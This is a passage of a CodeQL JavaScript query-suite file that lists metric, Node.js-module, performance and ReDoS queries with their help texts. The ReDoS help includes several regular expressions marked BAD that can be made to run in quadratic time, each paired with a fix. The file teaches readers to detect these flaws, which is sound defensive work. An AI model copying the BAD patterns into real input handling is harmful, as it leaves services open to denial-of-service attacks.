      metricType: file
      metricAggregate: avg sum max
      id: js/lines-per-file
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Metrics/FLinesOfCode.ql
    relativeBqrsPath: codeql/javascript-queries/Metrics/FLinesOfCode.bqrs
    metadata:
      name: Lines of code in files
      kind: treemap
      description: |-
        Measures the number of lines of code in each file, ignoring lines that
                      contain only comments or whitespace.
      treemap.warnOn: highValues
      metricType: file
      metricAggregate: avg sum max
      id: js/lines-of-code-in-files
      tags: maintainability
    queryHelp: |
      # Lines of code in files
      There are a number of problems associated with a high number of lines of code:

      * It can be difficult to understand and maintain, even with good tool support.
      * It increases the likelihood of multiple developers needing to work on the same file at once, and it therefore increases the likelihood of merge conflicts.
      * It may increase network traffic if you use a version control system that requires the whole file to be transmitted even for a tiny change.
      * It may arise as a result of bundling many unrelated things into the same file, and so it can indicate weak code organization.

      ## Recommendation
      The solution depends on the reason for the high number of lines:

      * If the file contains one or more very large functions, you should decompose them into smaller functions by means of the Extract Function refactoring.
      * If the file contains many smaller functions, you should try to split up the file into multiple smaller files.
      * If the file has been automatically generated by a tool, no changes are required because the file will not be maintained by a programmer.

      ## References
      * M. Fowler, *Refactoring*. Addison-Wesley, 1999.
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Metrics/FLinesOfComment.ql
    relativeBqrsPath: codeql/javascript-queries/Metrics/FLinesOfComment.bqrs
    metadata:
      name: Lines of comments in files
      description:
        Files with few lines of comment might not have sufficient documentation
        to make them understandable.
      kind: treemap
      treemap.warnOn: lowValues
      metricType: file
      metricAggregate: avg sum max
      id: js/lines-of-comments-in-files
      tags: documentation
    queryHelp: |
      # Lines of comments in files
      This metric measures the number of comment lines per file. A low number of comments may indicate files that are difficult to understand due to poor documentation.


      ## Recommendation
      Consider if the file needs more documentation. Most files should have at least a comment explaining their purpose.


      ## References
      * Jeff Atwood. [Avoiding Undocumentation](http://www.codinghorror.com/blog/2005/11/avoiding-undocumentation.html). 2005.
      * Steve McConnell. *Code Complete*. 2nd Edition. Microsoft Press. 2004.
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Metrics/FLinesOfDuplicatedCode.ql
    relativeBqrsPath: codeql/javascript-queries/Metrics/FLinesOfDuplicatedCode.bqrs
    metadata:
      deprecated: ''
      name: Duplicated lines in files
      description: |-
        The number of lines in a file (including code, comment and whitespace lines)
                      occurring in a block of lines that is duplicated at least once somewhere else.
      kind: treemap
      treemap.warnOn: highValues
      metricType: file
      metricAggregate: avg sum max
      id: js/duplicated-lines-in-files
      tags: |-
        testability
               duplicate-code
               non-attributable
    queryHelp: |
      # Duplicated lines in files
      This metric measures the number of lines in a file that are contained within a block that is duplicated elsewhere. These lines may include code, comments and whitespace, and the duplicate block may be in this file or in another file.

      A file that contains many lines that are duplicated within the code base is problematic for a number of reasons.

      Duplicated code increases overall code size, making the code base harder to maintain and harder to understand. It also becomes harder to fix bugs, since a programmer applying a fix to one copy has to always remember to update other copies accordingly. Finally, code duplication is generally an indication of a poorly designed or hastily written code base, which typically suffers from other problems as well.


      ## Recommendation
      Refactor files with lots of duplicated code to extract the common code into a shared library or module.


      ## References
      * Wikipedia: [Duplicate code](http://en.wikipedia.org/wiki/Duplicate_code).
      * M. Fowler, *Refactoring*. Addison-Wesley, 1999.
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Metrics/FLinesOfSimilarCode.ql
    relativeBqrsPath: codeql/javascript-queries/Metrics/FLinesOfSimilarCode.bqrs
    metadata:
      deprecated: ''
      name: Similar lines in files
      description: |-
        The number of lines in a file (including code, comment and whitespace lines)
                      occurring in a block of lines that is similar to a block of lines seen
                      somewhere else.
      kind: treemap
      treemap.warnOn: highValues
      metricType: file
      metricAggregate: avg sum max
      id: js/similar-lines-in-files
      tags: |-
        testability
               duplicate-code
               non-attributable
    queryHelp: |
      # Similar lines in files
      This metric measures the number of lines in a file that are contained within a block that is duplicated elsewhere. These lines may include code, comments and whitespace, and the duplicate block may be in this file or in another file.

      A file that contains many lines that are similar to other code within the code base is problematic for the same reasons as a file that contains a lot of (exactly) duplicated code.

      Duplicated code increases overall code size, making the code base harder to maintain and harder to understand. It also becomes harder to fix bugs, since a programmer applying a fix to one copy has to always remember to update other copies accordingly. Finally, code duplication is generally an indication of a poorly designed or hastily written code base, which typically suffers from other problems as well.


      ## Recommendation
      Refactor similar code snippets by extracting common functionality into functions that can be reused across modules.


      ## References
      * Wikipedia: [Duplicate code](http://en.wikipedia.org/wiki/Duplicate_code).
      * M. Fowler, *Refactoring*. Addison-Wesley, 1999.
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Metrics/FNumberOfStatements.ql
    relativeBqrsPath: codeql/javascript-queries/Metrics/FNumberOfStatements.bqrs
    metadata:
      name: Number of statements in files
      description: The number of statements in a file.
      kind: treemap
      treemap.warnOn: highValues
      metricType: file
      metricAggregate: avg sum max
      id: js/statements-per-file
    queryHelp: |
      # Number of statements in files
      This metric measures the number of statements in a file.

      If there are too many statements in a file, it is generally for one of two reasons:

      * One or more individual functions in the file contain too many statements, making them hard to understand, difficult to check and a common source of defects. These functions typically lack cohesion because they are trying to do too many things.
      * The file contains too many functions, which generally indicates that it is trying to do too much, either at the interface or implementation level or both. It can be difficult for readers to understand because there is a confusing list of operations.

      ## Recommendation
      Long individual functions should be refactored into multiple, smaller parts. Files that contain many functions should be split up into smaller, more coherent units.


      ## References
      * M. Fowler. *Refactoring*. Addison-Wesley, 1999.
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Metrics/FNumberOfTests.ql
    relativeBqrsPath: codeql/javascript-queries/Metrics/FNumberOfTests.bqrs
    metadata:
      name: Number of tests
      description: The number of tests defined in a file.
      kind: treemap
      treemap.warnOn: lowValues
      metricType: file
      metricAggregate: avg sum max
      id: js/test-in-files
    queryHelp: |
      # Number of tests
      This metric measures how many tests each file contains. By default, the query recognizes QUnit tests, xUnit.js facts, and BDD-style tests as used by frameworks such as Jasmine, Mocha and Unit.js.


      ## Recommendation
      This metric can be used to identify parts of the code base that have very few tests and could perhaps benefit from more thorough testing.


      ## References
      * [QUnit](https://qunitjs.com/)
      * [xUnit.js](http://xunitjs.shaege.com/)
      * [Jasmine](http://jasmine.github.io/)
      * [Unit.js](http://unitjs.com/)
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Metrics/FunCyclomaticComplexity.ql
    relativeBqrsPath: codeql/javascript-queries/Metrics/FunCyclomaticComplexity.bqrs
    metadata:
      name: Cyclomatic complexity of functions
      description: The cyclomatic complexity of a function.
      kind: treemap
      treemap.warnOn: highValues
      metricType: callable
      metricAggregate: avg max sum
      tags: testability
      id: js/cyclomatic-complexity-per-function
    queryHelp: |
      # Cyclomatic complexity of functions
      This metric measures the cyclomatic complexity of each function in the project.

      The cyclomatic complexity of a function is an indication of the number of paths that can be taken during the execution of a function. Code with many branches and loops has high cyclomatic complexity. A cyclomatic complexity above 50 should be considered bad practice and above 75 should definitely be addressed.

      Functions with high cyclomatic complexity are

      * difficult to test since tests should be provided for each possible execution path;
      * difficult to understand since a developer needs to understand how all conditions interact;
      * difficult to maintain since many execution paths is an indication of functions that perform too many tasks.

      ## Recommendation
      The primary way to reduce the complexity is to extract sub-functionality into separate functions. This improves on all problems described above. If the function naturally breaks up into a sequence of operations it is preferable to extract each operation as a separate function. Even if that's not the case it is often possible to extract the body of an iteration into a separate function to reduce complexity. If the complexity can't be reduced significantly make sure that the function is properly documented and carefully tested.


      ## References
      * M. Fowler. *Refactoring*. Addison-Wesley, 1999.
      * T. J. McCabe. *A Complexity Measure*. IEEE Transactions on Software Engineering, SE-2(4), December 1976.
      * Wikipedia: [Cyclomatic complexity](http://en.wikipedia.org/wiki/Cyclomatic_complexity).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Metrics/FunLinesOfCode.ql
    relativeBqrsPath: codeql/javascript-queries/Metrics/FunLinesOfCode.bqrs
    metadata:
      name: Lines of code in functions
      description: The number of lines of code in a function.
      kind: treemap
      treemap.warnOn: highValues
      metricType: callable
      metricAggregate: avg sum max
      tags: maintainability
      id: js/lines-of-code-per-function
    queryHelp: |
      # Lines of code in functions
      This metric measures the number of lines of code in a function, excluding comments and blank lines.

      Having too many lines of code in a function is an indication that it can be split into several functions of more manageable size.


      ## Recommendation
      Long functions should be examined to see if they can be split into smaller, more cohesive functions.


      ## References
      * M. Fowler. *Refactoring*. Addison-Wesley, 1999.
      * [Wikipedia: Code refactoring](https://en.wikipedia.org/wiki/Code_refactoring)
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Metrics/FUseOfES6.ql
    relativeBqrsPath: codeql/javascript-queries/Metrics/FUseOfES6.bqrs
    metadata:
      name: Use of ECMAScript 2015 (and later) features in files
      kind: treemap
      description: |-
        Measures the number of uses of language features introduced in
                      ECMAScript 2015 or later in files.
      treemap.warnOn: highValues
      metricType: file
      metricAggregate: avg sum max
      id: js/es20xx-features-per-file
    queryHelp: |
      # Use of ECMAScript 2015 (and later) features in files
      This metric measures, for each file, how often it uses language features that were introduced in ECMAScript 2015 (also known as ECMAScript 6) or later.


      ## Recommendation
      If a code base is intended to be ECMAScript 5 compatible, this metric can be used to identify parts of the code base that are making use of new features that are not yet available in ECMAScript 5.

      For code bases that should be migrated to ECMAScript 2015 or later, tracking this metric over time is useful for assessing the progress of the migration.


      ## References
      * Ecma International: [ECMAScript 2015 Language Specification](https://262.ecma-international.org/6.0/).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: NodeJS/CyclicImport.ql
    relativeBqrsPath: codeql/javascript-queries/NodeJS/CyclicImport.bqrs
    metadata:
      name: Cyclic module import
      description: |-
        If a module indirectly imports itself, some modules involved in the import cycle may end up
                      with partially loaded dependencies. This is error-prone and should be avoided.
      kind: problem
      problem.severity: warning
      id: js/node/cyclic-import
      tags: |-
        reliability
               maintainability
               frameworks/node.js
      precision: low
    queryHelp:
      "# Cyclic module import\nModule imports in node.js can be cyclic, that\
      \ is, a module can (directly or indirectly) import itself. In order to prevent\
      \ an infinite loop, such cyclic imports return incomplete copies of the loaded\
      \ module, which do not yet have all exported members available. Such incomplete\
      \ modules are difficult to work with, and cyclic dependencies in general make\
      \ the code hard to maintain and understand. Consequently, cyclic imports should\
      \ be avoided.\n\n\n## Recommendation\nRefactor the involved modules to break the\
      \ dependency cycle.\n\n\n## Example\nIn the following example, module `a.js` depends\
      \ on module `b.js`, which in turn depends on module `a.js`, so they each import\
      \ the other module, leading to an import cycle.\n\n\n```javascript\n// a.js\n\
      var b = require('./b');\n\nvar title = \"Ms\";\n\nfunction example() {\n\treturn\
      \ title + \" \" + b.fullName;\n}\n\nexports.firstName = \"Ada\";\n\n// b.js\n\
      var a = require('./a');\n\nvar lastName = \"Lovelace\";\n\nexports.fullName =\
      \ a.firstName + \" \" + lastName;\n```\nThe cyclic dependency can be fixed by\
      \ moving `firstName` into module `b.js`, so that it no longer depends on `a.js`:\n\
      \n\n```javascript\n// a.js\nvar b = require('./b');\n\nvar title = \"Ms\";\n\n\
      function example() {\n  return title + \" \" + b.fullName;\n}\n\n// b.js\nvar\
      \ firstName = \"Ada\",\n    lastName = \"Lovelace\";\n\nexports.fullName = firstName\
      \ + \" \" + lastName;\n\n```\n\n## References\n* Brad Harris: [node.js and circular\
      \ dependencies](https://web.archive.org/web/20200203213815/http://selfcontained.us/2012/05/08/node-js-circular-dependencies/).\n\
      * Node.js Manual: [Modules](http://nodejs.org/api/modules.html#modules_cycles).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: NodeJS/DubiousImport.ql
    relativeBqrsPath: codeql/javascript-queries/NodeJS/DubiousImport.bqrs
    metadata:
      name: Dubious import
      description:
        Importing a symbol from a module that does not export it most likely
        indicates a bug.
      kind: problem
      problem.severity: warning
      id: js/node/import-without-export
      tags: |-
        reliability
               maintainability
               frameworks/node.js
      precision: low
    queryHelp:
      "# Dubious import\nSince JavaScript is a dynamically typed language,\
      \ module imports in node.js are not statically checked for correctness: calls\
      \ to `require` simply return an object containing all the exports of the imported\
      \ module, and accessing a member that was not, in fact, exported, yields `undefined`.\
      \ This is most likely unintentional and usually indicates a bug.\n\n\n## Recommendation\n\
      Examine the import in question and determine the correct name of the symbol to\
      \ import.\n\n\n## Example\nIn the following example, module `point.js` exports\
      \ the function `Point` by assigning it to `module.exports`. The client module\
      \ `client.js` tries to import it by reading from the `Point` property, but since\
      \ this property does not exist the result will be `undefined`, and the `new` invocation\
      \ will fail.\n\n\n```javascript\n// point.js\nfunction Point(x, y) {\n\tthis.x\
      \ = x;\n\tthis.y = y;\n}\n\nPoint.prototype.distance = function() {\n\treturn\
      \ Math.sqrt(this.x*this.x+this.y*this.y);\n};\n\nmodule.exports = Point;\n\n//\
      \ client.js\nvar Point = require('./point').Point;\n\nvar pyth = new Point(3,\
      \ 4);\nconsole.log(pyth.distance());\n```\nInstead of reading the `Point` property,\
      \ `client.js` should directly use the result of the `require` call:\n\n\n```javascript\n\
      // point.js\nfunction Point(x, y) {\n\tthis.x = x;\n\tthis.y = y;\n}\n\nPoint.prototype.distance\
      \ = function() {\n\treturn Math.sqrt(this.x*this.x+this.y*this.y);\n};\n\nmodule.exports\
      \ = Point;\n\n// client.js\nvar Point = require('./point');\n\nvar pyth = new\
      \ Point(3, 4);\nconsole.log(pyth.distance());\n```\n\n## References\n* Node.js\
      \ Manual: [Modules](http://nodejs.org/api/modules.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: NodeJS/InvalidExport.ql
    relativeBqrsPath: codeql/javascript-queries/NodeJS/InvalidExport.bqrs
    metadata:
      name: Assignment to exports variable
      description: |-
        Assigning to the special 'exports' variable only overwrites its value and does not export
                      anything. Such an assignment is hence most likely unintentional.
      kind: problem
      problem.severity: warning
      id: js/node/assignment-to-exports-variable
      tags: |-
        quality
               reliability
               correctness
               frameworks/node.js
               external/cwe/cwe-563
      precision: very-high
    queryHelp:
      "# Assignment to exports variable\nNode.js modules that only export a\
      \ single value commonly do so by assigning it directly to the `module.exports`\
      \ property. A common mistake is to assign it to the `exports` variable instead,\
      \ but this simply overwrites the value of `exports` without affecting the value\
      \ of `module.exports`, and does not lead to anything being exported.\n\n\n## Recommendation\n\
      Rewrite the assignment to assign to `module.exports` instead.\n\n\n## Example\n\
      In the following example, module `point.js` attempts to export the function `Point`\
      \ by assigning it to `exports`. As explained above, this does not work as expected:\
      \ after the assignment, the `exports` *variable* will contain a reference to `Point`,\
      \ but the `module.exports` *property* still contains a reference to an empty object.\
      \ Consequently, the client code in `client.js` will fail, since it attempts to\
      \ call an object as a constructor.\n\n\n```javascript\n// point.js\nfunction Point(x,\
      \ y) {\n\tthis.x = x;\n\tthis.y = y;\n}\n\nPoint.prototype.distance = function()\
      \ {\n\treturn Math.sqrt(this.x*this.x+this.y*this.y);\n};\n\nexports = Point;\n\
      \n// client.js\nvar Point = require('./point');\n\nvar pyth = new Point(3, 4);\n\
      console.log(pyth.distance());\n```\nInstead of assigning to `exports`, `point.js`\
      \ should assign to `module.exports`:\n\n\n```javascript\n// point.js\nfunction\
      \ Point(x, y) {\n\tthis.x = x;\n\tthis.y = y;\n}\n\nPoint.prototype.distance =\
      \ function() {\n\treturn Math.sqrt(this.x*this.x+this.y*this.y);\n};\n\nmodule.exports\
      \ = Point;\n\n// client.js\nvar Point = require('./point');\n\nvar pyth = new\
      \ Point(3, 4);\nconsole.log(pyth.distance());\n```\n\n## References\n* Node.js\
      \ Manual: [exports alias](http://nodejs.org/api/modules.html#modules_exports_alias).\n\
      * Common Weakness Enumeration: [CWE-563](https://cwe.mitre.org/data/definitions/563.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: NodeJS/MissingExports.ql
    relativeBqrsPath: codeql/javascript-queries/NodeJS/MissingExports.bqrs
    metadata:
      name: Missing exports qualifier
      description: |-
        Referencing an undeclared global variable in a module that exports
                      a definition of the same name is confusing and may indicate a bug.
      kind: problem
      problem.severity: error
      id: js/node/missing-exports-qualifier
      tags: |-
        quality
               reliability
               correctness
               frameworks/node.js
      precision: high
    queryHelp: |
      # Missing exports qualifier
      Referencing an otherwise undeclared global variable in a module that exports a definition of the same name is confusing and may indicate a bug.


      ## Recommendation
      If the global variable reference is intentional, consider adding a JSLint `/*global ...*/` directive or an externs declaration to declare the variable.

      If the global variable reference is unintentional, qualifying the reference with `exports` will make it refer to the exported definition instead.


      ## Example
      In the following example, the module exports two functions `checkOne` and `checkList`. The latter is also stored in a variable of the same name that is local to the module, but the former is not. Hence the call `checkOne(xs[i])` on line 7 does not refer to the function defined on line 1, but to an otherwise undeclared global variable also called `checkOne`.


      ```javascript
      exports.checkOne = function(x) {
        if (!x) throw new Error();
      };

      var checkList = exports.checkList = function(xs) {
        for (var i=0; i<xs.length; ++i)
          checkOne(xs[i]);
      };
      ```
      Assuming that the intention is to call the `checkOne` function defined on line 1, the call should be qualified with `exports` like this:


      ```javascript
      exports.checkOne = function(x) {
        if (!x) throw new Error();
      };

      var checkList = exports.checkList = function(xs) {
        for (var i=0; i<xs.length; ++i)
          exports.checkOne(xs[i]);
      };
      ```

      ## References
      * Node.js: [Modules](https://nodejs.org/api/modules.html).
      * JSLint Help: [JSLint Directives](http://www.jslint.com/help.html).
      * Closure Compiler: [Advanced Compilation and Externs](https://developers.google.com/closure/compiler/docs/api-tutorial3).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: NodeJS/UnresolvableImport.ql
    relativeBqrsPath: codeql/javascript-queries/NodeJS/UnresolvableImport.bqrs
    metadata:
      name: Unresolvable import
      description: |-
        An import that cannot be resolved to a module will
                      cause an exception at runtime.
      kind: problem
      problem.severity: warning
      id: js/node/unresolvable-import
      tags: |-
        maintainability
               frameworks/node.js
      precision: low
    queryHelp: |
      # Unresolvable import
      Node.js modules can be imported either directly by specifying a file or folder, or indirectly by specifying a module name, which will be looked up in a `node_modules` folder. In the latter case, care should be taken that the imported module is either bundled with the code that uses it, or declared as a dependency in the `package.json` file to ensure that the import does not fail at runtime.


      ## Recommendation
      Declare the dependency in the `package.json` file or include an externs file for it during extraction.

      Externs files for all the core packages of Node.js are available in the `tool/data/externs/nodejs` directory of the distribution, and are included by default for projects created using bootstrap.


      ## Example
      In the following example, the `package.json` file specifies no dependencies, but `index.js` imports `acorn`. This import will fail unless a copy of `acorn` happens to be installed (for instance in the user's `node_modules` folder). On the other hand, the import of `fs` is unproblematic, since `fs` is a standard module that is included with every Node.js installation.


      ```javascript
      // package.json
      {
        "name": "example-package",
        "version": "0.1.0"
      }

      // index.js
      var acorn = require('acorn'),
          fs = require('fs');
      acorn.parse(fs.readFileSync('tst.js'), 'utf-8');
      ```
      The dependency on `acorn` should be declared in the `package.json` file:


      ```javascript
      // package.json
      {
        "name": "example-package",
        "version": "0.1.0",
        "dependencies": {
          "acorn": "*"
        }
      }

      // index.js
      var acorn = require('acorn'),
          fs = require('fs');
      acorn.parse(fs.readFileSync('tst.js'), 'utf-8');
      ```

      ## References
      * Node.js Manual: [Module resolution algorithm](https://nodejs.org/api/modules.html#modules_all_together).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: NodeJS/UnusedDependency.ql
    relativeBqrsPath: codeql/javascript-queries/NodeJS/UnusedDependency.bqrs
    metadata:
      name: Unused npm dependency
      description: |-
        If unnecessary package dependencies are included in package.json, the
                      package will become harder to install.
      kind: problem
      problem.severity: recommendation
      id: js/node/unused-npm-dependency
      tags: |-
        maintainability
               frameworks/node.js
      precision: low
    queryHelp: |
      # Unused npm dependency
      Specifying an unused dependency in `package.json` may make packages harder to install. The unused dependency will still be downloaded by npm, and if it conflicts with another package installation will become difficult or impossible.

      Dependencies on packages that are only used during development (such as testing frameworks or linters) should be listed under `devDependencies` rather than `dependencies`, since they are not required for deployment.


      ## Recommendation
      Remove the unused dependency.


      ## Example
      In the following example, the `package.json` file specifies dependencies on both `acorn` and `esprima`, but in fact only `acorn` is used. The dependency on `esprima` can simply be removed.


      ```javascript
      // package.json
      {
        "name": "example-package",
        "version": "0.1.0",
        "dependencies": {
          "acorn": "*",
          "esprima": "~2.0.0"
        }
      }

      // index.js
      var acorn = require('acorn'),
          fs = require('fs');
      acorn.parse(fs.readFileSync('tst.js'), 'utf-8');
      ```
      As another example, the following `package.json` file specifies a dependency on `eslint-plugin-babel`, a plugin for a popular linter:

      ```javascript

      {
        "name": "another-example-package",
        "version": "0.1.0",
        "dependencies": {
          "eslint-plugin-babel": "3.3.0"
        }
      }

      ```
      Since this dependency is only used during development, it should instead be listed under `devDependencies`:

      ```javascript

      {
        "name": "another-example-package",
        "version": "0.1.0",
        "devDependencies": {
          "eslint-plugin-babel": "3.3.0"
        }
      }

      ```

      ## References
      * NPM Manual: [package.json](https://docs.npmjs.com/cli/v7/configuring-npm/package-json).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Performance/NonLocalForIn.ql
    relativeBqrsPath: codeql/javascript-queries/Performance/NonLocalForIn.bqrs
    metadata:
      name: Iteration using non-local variable
      description: |-
        For-in/for-of loops whose iteration variable is not a purely local variable may
                      prevent optimization of the surrounding function.
      kind: problem
      problem.severity: warning
      id: js/iteration-using-non-local-variable
      tags: |-
        efficiency
               maintainability
      precision: low
    queryHelp: |
      # Iteration using non-local variable
      A for-in loop whose iteration variable is a property, a global variable, a local variable from a surrounding scope, or a local variable that is captured in a closure may prevent optimization of the function it appears in, which could make the program run slower. The same applies to for-of loops.

      In particular, the V8 engine (which is used by the Google Chrome browser and the Node.js platform) does not currently optimize functions containing such loops.


      ## Recommendation
      Turn the iteration variable into a local variable if possible.


      ## Example
      In the following example, function `extend` copies all properties of its argument `src` into object `dest` using a for-in loop. Note, however, that the loop variable `p` is not declared in `extend`, and thus is interpreted as a global variable.


      ```javascript
      function extend(dest, src) {
          for (p in src)
              dest[p] = src[p];
          return dest;
      }
      ```
      However, this is clearly just a typo, and the `p` should be declared as a local variable instead:


      ```javascript
      function extend(dest, src) {
          for (var p in src)
              dest[p] = src[p];
          return dest;
      }
      ```
      As another example, consider the following generalization of `extend` that accepts zero or more `src` objects:


      ```javascript
      function combine(dest) {
          var p;

          function extend(src) {
              for (p in src)
                  dest[p] = src[p];
          }

          for (var i=1; i<arguments.length; ++i)
              extend(arguments[i]);

          return dest;
      }
      ```
      Note that `p` is now a local variable, but it is declared in the outer function `combine`, not in the inner function `extend` where it is actually used. The declaration should be moved into `extend` as follows:


      ```javascript
      function combine(dest) {
          function extend(src) {
              for (var p in src)
                  dest[p] = src[p];
          }

          for (var i=1; i<arguments.length; ++i)
              extend(arguments[i]);

          return dest;
      }
      ```
      In those (rare) cases where the iteration variable really has to be a global variable or a property, you can introduce a new, local iteration variable and copy its value into the desired global variable or property inside the loop.


      ## References
      * Petka Antonov: [Optimization killers](https://github.com/petkaantonov/bluebird/wiki/Optimization-killers#5-for-in).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Performance/PolynomialReDoS.ql
    relativeBqrsPath: codeql/javascript-queries/Performance/PolynomialReDoS.bqrs
    metadata:
      name: Polynomial regular expression used on uncontrolled data
      description: |-
        A regular expression that can require polynomial time
                      to match may be vulnerable to denial-of-service attacks.
      kind: path-problem
      problem.severity: warning
      security-severity: 7.5
      precision: high
      id: js/polynomial-redos
      tags: |-
        security
               external/cwe/cwe-1333
               external/cwe/cwe-730
               external/cwe/cwe-400
    queryHelp: |
      # Polynomial regular expression used on uncontrolled data
      Some regular expressions take a long time to match certain input strings to the point where the time it takes to match a string of length *n* is proportional to *n<sup>k</sup>* or even *2<sup>n</sup>*. Such regular expressions can negatively affect performance, or even allow a malicious user to perform a Denial of Service ("DoS") attack by crafting an expensive input string for the regular expression to match.

      The regular expression engines provided by many popular JavaScript platforms use backtracking non-deterministic finite automata to implement regular expression matching. While this approach is space-efficient and allows supporting advanced features like capture groups, it is not time-efficient in general. The worst-case time complexity of such an automaton can be polynomial or even exponential, meaning that for strings of a certain shape, increasing the input length by ten characters may make the automaton about 1000 times slower.

      Typically, a regular expression is affected by this problem if it contains a repetition of the form `r*` or `r+` where the sub-expression `r` is ambiguous in the sense that it can match some string in multiple ways. More information about the precise circumstances can be found in the references.


      ## Recommendation
      Modify the regular expression to remove the ambiguity, or ensure that the strings matched with the regular expression are short enough that the time-complexity does not matter.


      ## Example
      Consider this use of a regular expression, which removes all leading and trailing whitespace in a string:

      ```javascript

      text.replace(/^\s+|\s+$/g, ''); // BAD
      ```
      The sub-expression `"\s+$"` will match the whitespace characters in `text` from left to right, but it can start matching anywhere within a whitespace sequence. This is problematic for strings that do **not** end with a whitespace character. Such a string will force the regular expression engine to process each whitespace sequence once per whitespace character in the sequence.

      This ultimately means that the time cost of trimming a string is quadratic in the length of the string. So a string like `"a b"` will take milliseconds to process, but a similar string with a million spaces instead of just one will take several minutes.

      Avoid this problem by rewriting the regular expression to not contain the ambiguity about when to start matching whitespace sequences. For instance, by using a negative look-behind (`/^\s+|(?<!\s)\s+$/g`), or just by using the built-in trim method (`text.trim()`).

      Note that the sub-expression `"^\s+"` is **not** problematic as the `^` anchor restricts when that sub-expression can start matching, and as the regular expression engine matches from left to right.


      ## Example
      As a similar, but slightly subtler problem, consider the regular expression that matches lines with numbers, possibly written using scientific notation:

      ```javascript

      /^0\.\d+E?\d+$/.test(str) // BAD
      ```
      The problem with this regular expression is in the sub-expression `\d+E?\d+` because the second `\d+` can start matching digits anywhere after the first match of the first `\d+` if there is no `E` in the input string.

      This is problematic for strings that do **not** end with a digit. Such a string will force the regular expression engine to process each digit sequence once per digit in the sequence, again leading to a quadratic time complexity.

      To make the processing faster, the regular expression should be rewritten such that the two `\d+` sub-expressions do not have overlapping matches: `^0\.\d+(E\d+)?$`.


      ## Example
      Sometimes it is unclear how a regular expression can be rewritten to avoid the problem. In such cases, it often suffices to limit the length of the input string. For instance, the following regular expression is used to match numbers, and on some non-number inputs it can have quadratic time complexity:

      ```javascript

      /^(\+|-)?(\d+|(\d*\.\d*))?(E|e)?([-+])?(\d+)?$/.test(str) // BAD
      ```
      It is not immediately obvious how to rewrite this regular expression to avoid the problem. However, you can mitigate performance issues by limiting the length to 1000 characters, which will always finish in a reasonable amount of time.

      ```javascript

      if (str.length > 1000) {
          throw new Error("Input too long");
      }

      /^(\+|-)?(\d+|(\d*\.\d*))?(E|e)?([-+])?(\d+)?$/.test(str)
      ```

      ## References
      * OWASP: [Regular expression Denial of Service - ReDoS](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS).
      * Wikipedia: [ReDoS](https://en.wikipedia.org/wiki/ReDoS).
      * Wikipedia: [Time complexity](https://en.wikipedia.org/wiki/Time_complexity).
      * James Kirrage, Asiri Rathnayake, Hayo Thielecke: [Static Analysis for Regular Expression Denial-of-Service Attack](https://arxiv.org/abs/1301.0849).
      * Common Weakness Enumeration: [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html).
      * Common Weakness Enumeration: [CWE-730](https://cwe.mitre.org/data/definitions/730.html).
      * Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Performance/ReassignParameterAndUseArguments.ql
    relativeBqrsPath: codeql/javascript-queries/Performance/ReassignParameterAndUseArguments.bqrs
    metadata:
      name: Parameter reassigned in function that uses arguments
      description: |-
        A function that reassigns one of its parameters and also uses the arguments object
                      may not be optimized properly.
      kind: problem
      problem.severity: recommendation
      id: js/parameter-reassignment-with-arguments
      tags: |-
        efficiency
               maintainability
      precision: medium
    queryHelp: |
      # Parameter reassigned in function that uses arguments
      A function that reassigns one of its parameters and also uses the special arguments object may not be optimized properly, which could make the program run slower. In particular, the V8 engine (which is used by the Google Chrome browser and the Node.js platform) does not currently perform any advanced optimizations on such functions.


      ## Recommendation
      Either eliminate all uses of the `arguments` variable, or copy the parameter into a local variable and reassign that local variable instead.


      ## Example
      In the following example, function `sum` takes two arguments `xs` and `start`, and returns the sum of all elements in the array `xs`, plus the value of `start`. The argument `start` is optional and defaults to `0`.


      ```javascript
      function sum(xs, start) {
          if (arguments.length < 2)
              start = 0;

          var sum = start;
          for (var i=0; i<xs.length; ++i)
              sum += xs[i];

          return sum;
      }

      ```
      Observe that to find out whether the argument was provided, `sum` checks `arguments.length` (which evaluates to the number of actual arguments passed to `sum`), and reassigns `sum` to `0` if fewer than two arguments were passed.

      In this example, it is easy to eliminate the use of the `arguments` variable: instead of checking `arguments.length`, we can instead check whether `sum` is undefined:


      ```javascript
      function sum(xs, start) {
          if (typeof start === 'undefined')
              start = 0;

          var sum = start;
          for (var i=0; i<xs.length; ++i)
              sum += xs[i];

          return sum;
      }

      ```
      A more general solution is to introduce a new local variable, assign the initial value of `sum` to this local variable, and then update and use the local variable instead of the parameter:


      ```javascript
      function sum(xs, _start) {
          var start = arguments.length < 2 ? 0 : _start;

          var sum = start;
          for (var i=0; i<xs.length; ++i)
              sum += xs[i];

          return sum;
      }

      ```

      ## References
      * Petka Antonov: [Optimization killers](https://github.com/petkaantonov/bluebird/wiki/Optimization-killers#31-reassigning-a-defined-parameter-while-also-mentioning-arguments-in-the-body-typical-example).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Performance/ReDoS.ql
    relativeBqrsPath: codeql/javascript-queries/Performance/ReDoS.bqrs
    metadata:
      name: Inefficient regular expression
      description: |-
        A regular expression that requires exponential time to match certain inputs
                      can be a performance bottleneck, and may be vulnerable to denial-of-service
                      attacks.
      kind: problem
      problem.severity: error
      security-severity: 7.5
      precision: high
      id: js/redos
      tags: |-
        security
               external/cwe/cwe-1333
               external/cwe/cwe-730
               external/cwe/cwe-400
    queryHelp: |
      # Inefficient regular expression
